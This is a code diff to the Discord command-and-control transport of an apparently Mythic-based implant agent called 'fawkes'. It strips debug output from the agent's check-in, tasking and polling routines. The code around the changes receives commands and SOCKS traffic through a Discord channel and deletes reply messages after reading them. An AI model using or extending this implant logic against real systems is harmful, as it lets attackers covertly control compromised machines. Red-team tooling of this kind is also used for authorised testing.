@@ -22,8 +22,6 @@ import (
 	"sync/atomic"
 	"time"
 
-	"os"
-
 	"fawkes/pkg/structs"
 )
 
@@ -328,33 +326,20 @@ func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
 		return fmt.Errorf("failed to parse checkin response: %w", err)
 	}
 
-	fmt.Fprintf(os.Stderr, "[discord] checkin response keys: %v", func() []string {
-		keys := make([]string, 0, len(checkinResponse))
-		for k := range checkinResponse {
-			keys = append(keys, k)
-		}
-		return keys
-	}())
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
 			d.UpdateCallbackUUID(callbackStr)
-			fmt.Fprintf(os.Stderr, "[discord] session from 'id': %s", callbackStr)
-		} else {
-			fmt.Fprintf(os.Stderr, "[discord] 'id' field not string, type=%T value=%v", callbackID, callbackID)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
 			d.UpdateCallbackUUID(callbackStr)
-			fmt.Fprintf(os.Stderr, "[discord] session from 'uuid': %s", callbackStr)
+			log.Printf("session: %s", callbackStr)
 		}
 	} else {
-		fmt.Fprintf(os.Stderr, "[discord] no session id, using default payload UUID")
+		log.Printf("no session id, using default")
 		d.UpdateCallbackUUID(agent.PayloadUUID)
 	}
-
-	// Verify UUID was stored
-	verifyUUID := d.GetCallbackUUID()
-	fmt.Fprintf(os.Stderr, "[discord] verified callback UUID after checkin: %s", verifyUUID)
 
 	return nil
 }
@@ -422,39 +407,27 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 	}
 
 	// Parse the decrypted response
-	fmt.Fprintf(os.Stderr, "[discord] GetTasking: decrypted %d bytes: %s\n", len(decryptedData), string(decryptedData[:min(300, len(decryptedData))]))
 	var taskResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
-		fmt.Fprintf(os.Stderr, "[discord] GetTasking: json parse error: %v data=%s\n", err, string(decryptedData[:min(200, len(decryptedData))]))
 		return []structs.Task{}, nil, nil
 	}
 
 	// Extract tasks
 	var tasks []structs.Task
 	if taskList, exists := taskResponse["tasks"]; exists {
-		fmt.Fprintf(os.Stderr, "[discord] GetTasking: found 'tasks' key, type=%T\n", taskList)
 		if taskArray, ok := taskList.([]interface{}); ok {
-			fmt.Fprintf(os.Stderr, "[discord] GetTasking: %d tasks in array\n", len(taskArray))
 			for _, taskData := range taskArray {
 				if taskMap, ok := taskData.(map[string]interface{}); ok {
-					tid := getString(taskMap, "id")
-					tcmd := getString(taskMap, "command")
-					tparams := getString(taskMap, "parameters")
-					fmt.Fprintf(os.Stderr, "[discord] GetTasking: task id=%s cmd=%s\n", tid, tcmd)
-					task := structs.NewTask(tid, tcmd, tparams)
+					task := structs.NewTask(
+						getString(taskMap, "id"),
+						getString(taskMap, "command"),
+						getString(taskMap, "parameters"),
+					)
 					tasks = append(tasks, task)
 				}
 			}
 		}
-	} else {
-		keys := make([]string, 0)
-		for k := range taskResponse {
-			keys = append(keys, k)
-		}
-		fmt.Fprintf(os.Stderr, "[discord] GetTasking: no 'tasks' key, response keys=%v\n", keys)
 	}
-
-	fmt.Fprintf(os.Stderr, "[discord] GetTasking: returning %d tasks\n", len(tasks))
 
 	// Extract SOCKS messages
 	var inboundSocks []structs.SocksMsg
@@ -639,7 +612,6 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 	}
 
 	// Poll for response matching our sender_id with to_server=false
-	fmt.Fprintf(os.Stderr, "[discord] sendAndPoll: senderID=%s clientID=%s msgLen=%d", senderID, clientID, len(mythicMessage))
 	for attempt := 0; attempt < d.MaxRetries; attempt++ {
 		time.Sleep(time.Duration(d.PollInterval) * time.Second)
 
@@ -649,15 +621,11 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 			continue
 		}
 
-		fmt.Fprintf(os.Stderr, "[discord] poll %d: %d messages in channel", attempt+1, len(messages))
 		for _, msg := range messages {
 			respWrapper, err := d.parseDiscordMessage(msg, cfg)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "[discord]   msg %s: parse error: %v", msg.ID, err)
 				continue
 			}
-
-			fmt.Fprintf(os.Stderr, "[discord]   msg %s: to_server=%v client_id=%s sender_id=%s", msg.ID, respWrapper.ToServer, respWrapper.ClientID, respWrapper.SenderID)
 
 			// Match: to_server=false and one of:
 			// - client_id matches our tracking ID (clientID)
@@ -665,7 +633,6 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 			// - client_id matches our sender_id (server echoes sender_id as client_id)
 			// - client_id matches payload UUID (Mythic push C2 uses payload UUID as TrackingID for pushed tasks)
 			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID || (d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID)) {
-				fmt.Fprintf(os.Stderr, "[discord]   MATCHED! deleting msg %s", msg.ID)
 				// Delete the response message from the channel after reading
 				d.deleteMessage(msg.ID, cfg)
 				return respWrapper.Message, nil
